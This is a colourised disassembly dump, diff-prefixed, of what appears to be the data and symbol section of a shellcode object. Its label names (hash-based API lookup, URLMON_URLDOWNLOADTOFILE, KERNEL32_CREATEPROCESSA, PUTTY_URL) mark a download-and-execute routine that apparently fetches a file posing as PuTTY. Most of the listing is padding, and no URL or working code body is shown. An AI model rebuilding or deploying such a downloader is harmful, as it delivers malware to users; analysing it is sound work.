+[32;1m0x46b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x46c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x46d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x46e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x46f[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x46f[0m [37malign 0x1                                [31;1m00 7c 00 00 ...[0m       [36;1m .|.....[0m
+[32;1m0x470[0m [37mdb 0x7c                                  [31;1m7c [0m                   [36;1m |[0m
+[32;1m0x471[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x472[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x473[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x474[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x475[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x475[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x47c[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x47d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x47e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x47f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x480[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x481[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x481[0m [37malign 0x1                                [31;1m00 8a 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x482[0m [37mdb 0x8a                                  [31;1m8a [0m                   [36;1m .[0m
+[32;1m0x483[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x484[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x485[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x486[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x487[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x487[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x48e[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x48f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x490[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x491[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x492[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x493[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x493[0m [37malign 0x1                                [31;1m00 98 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x494[0m [37mdb 0x98                                  [31;1m98 [0m                   [36;1m .[0m
+[32;1m0x495[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x496[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x497[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x498[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x499[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x499[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4a0[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x4a1[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4a2[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4a3[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4a4[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4a5[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4a5[0m [37malign 0x1                                [31;1m00 a9 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4a6[0m [37mdb 0xa9                                  [31;1ma9 [0m                   [36;1m .[0m
+[32;1m0x4a7[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4a8[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4a9[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4aa[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4ab[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4ab[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4b2[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x4b3[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4b4[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4b5[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4b6[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4b7[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4b7[0m [37malign 0x1                                [31;1m00 b3 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4b8[0m [37mdb 0xb3                                  [31;1mb3 [0m                   [36;1m .[0m
+[32;1m0x4b9[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4ba[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4bb[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4bc[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4bd[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4bd[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4c4[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x4c5[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4c6[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4c7[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4c8[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4c9[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4c9[0m [37malign 0x1                                [31;1m00 c1 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4ca[0m [37mdb 0xc1                                  [31;1mc1 [0m                   [36;1m .[0m
+[32;1m0x4cb[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4cc[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4cd[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4ce[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4cf[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4cf[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4d6[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x4d7[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4d8[0m [37mURLMON[35;1m ; string[0m		             [31;1m55 52 4c 4d 4f 4e [0m    [36;1m URLMON[0m
+[32;1m0x4de[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4df[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4e0[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4e1[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4e2[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4e2[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4e8[0m [37madd al, byte ptr [eax]                   [31;1m02 00 [0m                [36;1m ..[0m
+[32;1m0x4ea[0m [37mpush eax                                 [31;1m50 [0m                   [36;1m P[0m
+[32;1m0x4eb[0m [37minc ecx                                  [31;1m41 [0m                   [36;1m A[0m
+[32;1m0x4ec[0m [37mpush esp                                 [31;1m54 [0m                   [36;1m T[0m
+[32;1m0x4ed[0m [37mdec eax                                  [31;1m48 [0m                   [36;1m H[0m
+[32;1m0x4ee[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x4f0[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x4f2[0m [37malign 0x8                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x4fa[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x4fb[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4fc[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4fd[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4fe[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x4ff[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x4ff[0m [37malign 0x1                                [31;1m00 cb 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x500[0m [37mdb 0xcb                                  [31;1mcb [0m                   [36;1m .[0m
+[32;1m0x501[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x502[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x503[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x504[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x505[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x505[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x50c[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x50d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x50e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x50f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x510[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x511[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x511[0m [37malign 0x1                                [31;1m00 d5 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x512[0m [37mdb 0xd5                                  [31;1md5 [0m                   [36;1m .[0m
+[32;1m0x513[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x514[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x515[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x516[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x517[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x517[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x51e[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x51f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x520[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x521[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x522[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x523[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x523[0m [37malign 0x1                                [31;1m00 e7 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x524[0m [37mdb 0xe7                                  [31;1me7 [0m                   [36;1m .[0m
+[32;1m0x525[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x526[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x527[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x528[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x529[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x529[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x530[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x531[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x532[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x533[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x534[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x535[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x535[0m [37malign 0x1                                [31;1m00 fe 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x536[0m [37mdb 0xfe                                  [31;1mfe [0m                   [36;1m .[0m
+[32;1m0x537[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x538[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x539[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x53a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x53b[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x53b[0m [37malign 0x7                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x542[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x543[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x544[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x545[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x546[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x547[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x547[0m [37malign 0x1                                [31;1m00 16 01 00 ...[0m       [36;1m .......[0m
+[32;1m0x548[0m [37mpush ss                                  [31;1m16 [0m                   [36;1m .[0m
+[32;1m0x549[0m [37madd dword ptr [eax], eax                 [31;1m01 00 [0m                [36;1m ..[0m
+[32;1m0x54b[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x54d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x54e[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x554[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x555[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x556[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x557[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x558[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x559[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x559[0m [37malign 0x1                                [31;1m00 2b 01 00 ...[0m       [36;1m .+.....[0m
+[32;1m0x55a[0m [37msub eax, dword ptr [ecx]                 [31;1m2b 01 [0m                [36;1m +.[0m
+[32;1m0x55c[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x55e[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x560[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x566[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x567[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x568[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x569[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x56a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x56b[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x56b[0m [37malign 0x1                                [31;1m00 3b 01 00 ...[0m       [36;1m .;.....[0m
+[32;1m0x56c[0m [37mcmp eax, dword ptr [ecx]                 [31;1m3b 01 [0m                [36;1m ;.[0m
+[32;1m0x56e[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x570[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x572[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x578[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x579[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x57a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x57b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x57c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x57d[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x57d[0m [37malign 0x1                                [31;1m00 50 01 00 ...[0m       [36;1m .P.....[0m
+[32;1m0x57e[0m [37mpush eax                                 [31;1m50 [0m                   [36;1m P[0m
+[32;1m0x57f[0m [37madd dword ptr [eax], eax                 [31;1m01 00 [0m                [36;1m ..[0m
+[32;1m0x581[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x583[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x584[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x58a[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x58b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x58c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x58d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x58e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x58f[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x58f[0m [37malign 0x1                                [31;1m00 69 01 00 ...[0m       [36;1m .i.....[0m
+[32;1m0x590[0m [37mimul eax, dword ptr [ecx], 0             [31;1m69 01 00 00 00 00 [0m    [36;1m i.....[0m
+[32;1m0x596[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x59c[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x59d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x59e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x59f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5a0[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5a1[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x5a1[0m [37malign 0x1                                [31;1m00 7d 01 00 ...[0m       [36;1m .}.....[0m
+[32;1m0x5a2[0m [37mdb 0x7d                                  [31;1m7d [0m                   [36;1m }[0m
+[32;1m0x5a3[0m [37mdb 0x01                                  [31;1m01 [0m                   [36;1m .[0m
+[32;1m0x5a4[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[33;1m	 label_0x5a5:
+[0m[32;1m0x5a5[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5a6[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5a7[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5a8[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x5a8[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x5ae[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x5af[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5b0[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5b1[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5b2[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5b3[0m [37mdb 0x00                                  [31;1m[0m                      [36;1m [0m
+[32;1m0x5b3[0m [37malign 0x1                                [31;1m00 89 01 00 ...[0m       [36;1m .......[0m
+[32;1m0x5b4[0m [37mmov dword ptr [ecx], eax                 [31;1m89 01 [0m                [36;1m ..[0m
+[32;1m0x5b6[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x5b8[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x5ba[0m [37malign 0x6                                [31;1m00 00 00 00 ...[0m       [36;1m .......[0m
+[32;1m0x5c0[0m [37mdb 0x02                                  [31;1m02 [0m                   [36;1m .[0m
+[32;1m0x5c1[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5c2[0m [37mdb 0x40                                  [31;1m40 66 65 61 74 2e 30 30 [0m[36;1m @feat.00[0m
+[32;1m0x5ca[0m [37madd dword ptr [eax], eax                 [31;1m01 00 [0m                [36;1m ..[0m
+[32;1m0x5cc[0m [37madd byte ptr [eax], al                   [31;1m00 00 [0m                [36;1m ..[0m
+[32;1m0x5ce[0m [37mdb 0xff                                  [31;1mff [0m                   [36;1m .[0m
+[32;1m0x5cf[0m [37minc dword ptr [eax]                      [31;1mff 00 [0m                [36;1m ..[0m
+[32;1m0x5d1[0m [37madd byte ptr [ebx], al                   [31;1m00 03 [0m                [36;1m ..[0m
+[32;1m0x5d3[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5d4[0m [37mxchg eax, ebp                            [31;1m95 [0m                   [36;1m .[0m
+[32;1m0x5d5[0m [37madd dword ptr [eax], eax                 [31;1m01 00 [0m                [36;1m ..[0m
+[32;1m0x5d7[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5d8[0m [37mmainentrypoint[35;1m ; string[0m		     [31;1m6d 61 69 6e 65 6e 74 72 ...[0m[36;1m mainentrypoint[0m
+[32;1m0x5e6[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5e7[0m [37mget_module_address[35;1m ; string[0m		  [31;1m67 65 74 5f 6d 6f 64 75 ...[0m[36;1m get_module_address[0m
+[32;1m0x5f9[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x5fa[0m [37mnext_module_loop[35;1m ; string[0m		   [31;1m6e 65 78 74 5f 6d 6f 64 ...[0m[36;1m next_module_loop[0m
+[32;1m0x60a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x60b[0m [37mmodule_hash_loop[35;1m ; string[0m		   [31;1m6d 6f 64 75 6c 65 5f 68 ...[0m[36;1m module_hash_loop[0m
+[32;1m0x61b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x61c[0m [37mend_hash_check[35;1m ; string[0m		     [31;1m65 6e 64 5f 68 61 73 68 ...[0m[36;1m end_hash_check[0m
+[32;1m0x62a[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x62b[0m [37mend_module_hash_loop[35;1m ; string[0m		  [31;1m65 6e 64 5f 6d 6f 64 75 ...[0m[36;1m end_module_hash_loop[0m
+[32;1m0x63f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x640[0m [37mget_api_address[35;1m ; string[0m		    [31;1m67 65 74 5f 61 70 69 5f ...[0m[36;1m get_api_address[0m
+[32;1m0x64f[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x650[0m [37mload_api_hash[35;1m ; string[0m		      [31;1m6c 6f 61 64 5f 61 70 69 ...[0m[36;1m load_api_hash[0m
+[32;1m0x65d[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x65e[0m [37mload_api_name[35;1m ; string[0m		      [31;1m6c 6f 61 64 5f 61 70 69 ...[0m[36;1m load_api_name[0m
+[32;1m0x66b[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x66c[0m [37mcreate_hash_loop[35;1m ; string[0m		   [31;1m63 72 65 61 74 65 5f 68 ...[0m[36;1m create_hash_loop[0m
+[32;1m0x67c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x67d[0m [37mcallpop_1[35;1m ; string[0m		          [31;1m63 61 6c 6c 70 6f 70 5f ...[0m[36;1m callpop_1[0m
+[32;1m0x686[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x687[0m [37mload_api_addy[35;1m ; string[0m		      [31;1m6c 6f 61 64 5f 61 70 69 ...[0m[36;1m load_api_addy[0m
+[32;1m0x694[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x695[0m [37mcallpop_2[35;1m ; string[0m		          [31;1m63 61 6c 6c 70 6f 70 5f ...[0m[36;1m callpop_2[0m
+[32;1m0x69e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x69f[0m [37mPUTTY_URL[35;1m ; string[0m		          [31;1m50 55 54 54 59 5f 55 52 ...[0m[36;1m PUTTY_URL[0m
+[32;1m0x6a8[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x6a9[0m [37mKERNEL32HASHTABLE[35;1m ; string[0m		  [31;1m4b 45 52 4e 45 4c 33 32 ...[0m[36;1m KERNEL32HASHTABLE[0m
+[32;1m0x6ba[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x6bb[0m [37mKERNEL32FUNCTIONSTABLE[35;1m ; string[0m		  [31;1m4b 45 52 4e 45 4c 33 32 ...[0m[36;1m KERNEL32FUNCTIONSTABLE[0m
+[32;1m0x6d1[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x6d2[0m [37mKERNEL32_CREATEPROCESSA[35;1m ; string[0m		  [31;1m4b 45 52 4e 45 4c 33 32 ...[0m[36;1m KERNEL32_CREATEPROCESSA[0m
+[32;1m0x6e9[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x6ea[0m [37mKERNEL32_LOADLIBRARY[35;1m ; string[0m		  [31;1m4b 45 52 4e 45 4c 33 32 ...[0m[36;1m KERNEL32_LOADLIBRARY[0m
+[32;1m0x6fe[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x6ff[0m [37mURLMONHASHTABLE[35;1m ; string[0m		    [31;1m55 52 4c 4d 4f 4e 48 41 ...[0m[36;1m URLMONHASHTABLE[0m
+[32;1m0x70e[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x70f[0m [37mURLMONFUNCTIONSTABLE[35;1m ; string[0m		  [31;1m55 52 4c 4d 4f 4e 46 55 ...[0m[36;1m URLMONFUNCTIONSTABLE[0m
+[32;1m0x723[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x724[0m [37mURLMON_URLDOWNLOADTOFILE[35;1m ; string[0m		  [31;1m55 52 4c 4d 4f 4e 5f 55 ...[0m[36;1m URLMON_URLDOWNLOADTOFILE[0m
+[32;1m0x73c[0m [37mdb 0x00                                  [31;1m00 [0m                   [36;1m .[0m
+[32;1m0x73d[0m [37mPROCESS_INFORMATION[35;1m ; string[0m		  [31;1m50 52 4f 43 45 53 53 5f ...[0m[36;1m PROCESS_INFORMATION[0m
